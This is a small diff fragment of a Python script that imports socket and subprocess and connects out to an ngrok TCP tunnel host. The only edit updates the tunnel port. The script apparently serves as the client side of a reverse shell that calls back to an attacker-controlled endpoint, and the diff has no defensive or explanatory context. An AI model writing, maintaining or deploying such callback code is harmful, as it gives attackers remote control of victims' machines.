@@ -37,7 +37,7 @@ import socket
 import subprocess
 
 IP = "0.tcp.in.ngrok.io"   # ngrok host
-PORT = 17124               # ngrok port 
+PORT = 10452               # ngrok port 
 
 s = socket.socket()
 s.connect((IP, PORT))
